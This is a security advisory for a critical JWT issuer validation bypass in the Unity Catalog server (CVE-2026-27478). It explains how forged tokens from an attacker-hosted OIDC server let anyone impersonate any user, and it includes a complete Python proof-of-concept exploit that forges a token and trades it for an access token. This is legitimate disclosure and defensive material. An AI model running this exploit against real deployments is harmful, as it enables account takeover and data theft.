# [C] Unity Catalog has a JWT Issuer Validation Bypass tht Allows Complete User Impersonation

## Summary
Severity: Critical
Advisory: GHSA-qqcj-rghw-829x
CVE: CVE-2026-27478
CWE: CWE-1390, CWE-290, CWE-346
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-05-11
Source: https://github.com/advisories/GHSA-qqcj-rghw-829x
Type: github-advisory

## Affected
- Maven: `io.unitycatalog:unitycatalog-server` — affected >=0 <0.4.1

## Details
**Context:**
A critical authentication bypass vulnerability exists in the Unity Catalog token exchange endpoint (/api/1.0/unity-control/auth/tokens). The endpoint extracts the issuer (iss) claim from incoming JWTs and uses it to dynamically fetch the JWKS endpoint for signature validation without validating that the issuer is a trusted identity provider.

**Way to exploit:**

An attacker can exploit this by:
1. Hosting their own OIDC-compliant server with a valid JWKS endpoint
2. Signing a JWT with their own private key, setting the iss claim to their server
3. Setting the sub/email claim to any known user in the Unity Catalog system
4. Exchanging this crafted token for a valid internal access token

This results in complete impersonation of any user in the system, granting access to all catalogs, schemas, tables, and other resources that user has permissions to.

Additionally, the implementation does not validate the audience (aud) claim, allowing tokens intended for other services to be used.

**Example**

Example implementation doing token exchange with a self hosted `.well-known/openid-configuration` and `jwks` endpoint.

This can be run with `python3 main.py` and `TARGET_USER`, `UC_SERVER` and `PORT` adjusted to the testing setup.

```python
#!/usr/bin/env python3
"""Unity Catalog JWT Issuer Validation Bypass PoC - Minimal Version"""

import base64, secrets, threading, time
from datetime import datetime, timedelta, timezone
import jwt, requests
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from flask import Flask, jsonify

TARGET_USER = "user@example.com"
UC_SERVER = "http://localhost:8080"
PORT = 8888
ISSUER = f"http://localhost:{PORT}"

# Generate RSA key pair
key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
kid = secrets.token_hex(8)

# Create JWKS
pub = key.public_key().public_numbers()
def b64(n): return base64.urlsafe_b64encode(n.to_bytes((n.bit_length()+7)//8, "big")).rstrip(b"=").decode()
jwks = {"keys": [{"kty": "RSA", "use": "sig", "alg": "RS256", "kid": kid, "n": b64(pub.n), "e": b64(pub.e)}]}

# Create malicious JWT
token = jwt.encode(
    {"iss": ISSUER, "sub": TARGET_USER, "email": TARGET_USER, "aud": "unity-catalog",
     "iat": datetime.now(timezone.utc), "exp": datetime.now(timezone.utc) + timedelta(hours=1)},
    key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption()),
    algorithm="RS256", headers={"kid": kid}
)

# Start minimal OIDC server
app = Flask(__name__)
app.logger.disabled = True

@app.route("/.well-known/openid-configuration")
def oidc(): return jsonify({"issuer": ISSUER, "jwks_uri": f"{ISSUER}/jwks"})

@app.route("/jwks")
def keys(): return jsonify(jwks)

threading.Thread(target=lambda: app.run(port=PORT, threaded=True, use_reloader=False), daemon=True).start()
time.sleep(1)

# Exchange token
resp = requests.post(f"{UC_SERVER}/api/1.0/unity-control/auth/tokens",
                     data={"grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
                           "requested_token_type": "urn:ietf:params:oauth:token-type:access_token",
                           "subject_token_type": "urn:ietf:params:oauth:token-type:id_token",
                           "subject_token": token})

if resp.status_code == 200:
    access_token = resp.json()["access_token"]
    print(f"[+] Got access token as '{TARGET_USER}'")
    # Demo: list catalogs
    catalogs = requests.get(f"{UC_SERVER}/api/2.1/unity-catalog/catalogs",
                            headers={"Authorization": f"Bearer {access_token}"})
    print(catalogs.json())
else:
    print(f"[-] Failed: {resp.status_code} {resp.text}")
```

## References
- https://github.com/unitycatalog/unitycatalog/security/advisories/GHSA-qqcj-rghw-829x
- https://nvd.nist.gov/vuln/detail/CVE-2026-27478
- https://github.com/unitycatalog/unitycatalog
- https://github.com/unitycatalog/unitycatalog/releases/tag/v0.4.1
